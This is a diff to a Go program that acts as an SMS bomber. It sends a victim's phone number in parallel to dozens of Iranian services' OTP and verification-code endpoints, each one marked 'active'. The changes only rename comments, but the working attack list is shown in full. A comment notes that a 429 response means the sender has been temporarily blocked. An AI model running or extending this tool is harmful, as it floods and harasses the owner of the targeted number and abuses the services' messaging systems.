@@ -174,13 +174,13 @@ func main() {
 		go sendJSONRequest(ctx, "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-		// shab.ir enter-mobile (JSON - adjusted payload format)
+		// shab.ir (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
 			"mobile": phone, // Assuming the intent was {"mobile": "phone_number", "country_code": "+98"}
 			"country_code": "+98",
 		}, &wg, ch)  // active ✅
-		// Original Mobinnet JSON request (kept for reference/comparison)
+		//Mobinnet 
 		 wg.Add(1)
 		 go func(p string) {
 		 	sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": p}, &wg, ch)
@@ -200,12 +200,12 @@ func main() {
 		go sendJSONRequest(ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-		// alopeyk.com sms/send.php (JSON)
+		// alopeyk.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://alopeyk.com/api/sms/send.php", map[string]interface{}{
 			"phone": phone,
 		}, &wg, ch)  // active ✅
-		// alopeyk.com safir-service (JSON)
+		// alopeyk.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
 			"phone": phone,
@@ -230,12 +230,12 @@ func main() {
 		go sendJSONRequest(ctx, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-		// taraazws.jabama.com (JSON)
+		// jabama.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-		// api.torobpay.com (JSON)
+		// torobpay.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{
 			"phone_number": phone,
@@ -245,17 +245,17 @@ func main() {
 		go sendJSONRequest(ctx, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
 			"username": phone,
 		}, &wg, ch)  // active ✅
-		// miare.ir driver request (JSON)
+		// miare.ir (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
 			"phone_number": phone,
 		}, &wg, ch)  // active ✅
-		// api.pezeshket.com (JSON)
+		// pezeshket.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
 			"mobileNumber": phone,
 		}, &wg, ch)  // active ✅
-		// app.classino.com (JSON)
+		// classino.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
 			"mobile": phone,
@@ -265,12 +265,12 @@ func main() {
 		go sendJSONRequest(ctx, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 			"cellphone": phone,
 		}, &wg, ch)  // active ✅
-		// api.snapp.ir sms/link (JSON)
+		// api.snapp.ir (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
 			"phone": phone,
 		}, &wg, ch)  // active ✅
-		// api.snapp.market loginMobileWithNoPass (JSON) - Corrected URL with query params and JSON payload
+		// snapp.market(JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
 			"cellphone": phone,
@@ -285,43 +285,43 @@ func main() {
 		go sendJSONRequest(ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-		// api.bitycle.com register (JSON)
+		// bitycle.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
 			"phone": phone,
 		}, &wg, ch)  // active ✅
-		// uiapi2.saapa.ir (JSON)
+		//barghman (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-		// api.komodaa.com (JSON)
+		// komodaa.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
 			"phone_number": phone,
 		}, &wg, ch)  // active ✅
-		// ssr.anargift.com auth (JSON)
+		// anargift.com auth (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
 
-		// ssr.anargift.com auth/send_code (JSON)
+		// anargift.com (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-		// digitalsignup.snapp.ir otp (JSON) - Corrected URL with query params and JSON payload
+		// digitalsignup.snapp.ir 
 		wg.Add(1)
 		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
 			"cellphone": phone,
 		}, &wg, ch)  // active ✅
-		// digitalsignup.snapp.ir drivers/api/v1/otp (JSON)
+		// digitalsignup.snapp.ir (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
 			"cellphone": phone,
 		}, &wg, ch)  // active ✅
-		// Original Snappfood form request (kept for reference/comparison)
+		// Snappfood
 		 wg.Add(1)
 		 go func(p string) {
 		 	formData := url.Values{}
@@ -333,40 +333,40 @@ func main() {
 		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
 			"mobile": phone,
 			"device_type": 2,
-		}, &wg, ch) //aghe javab nadad bedalil in hast ke modati masdod shodi. Status Code:429	
+		}, &wg, ch) 
+//////////////////////////////////////////////////aghe javab nadad bedalil in hast ke modati masdod shodi. Status Code:429	
 
 		// irantic.com
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-		// irantic.com
+		// basalam.com
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅		
-		// irantic.com
+		// drnext.ir
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-		// irantic.com
+		// digikalajet.ir
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
 			"phone": phone,
 		}, &wg, ch)  // active ✅
-		// irantic.com
+		// caropex.com
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-		// irantic.com
+		// tetherland.com
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)  // active ✅
-		// irantic.com
+		// tandori.ir
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{
 			"phone": phone,
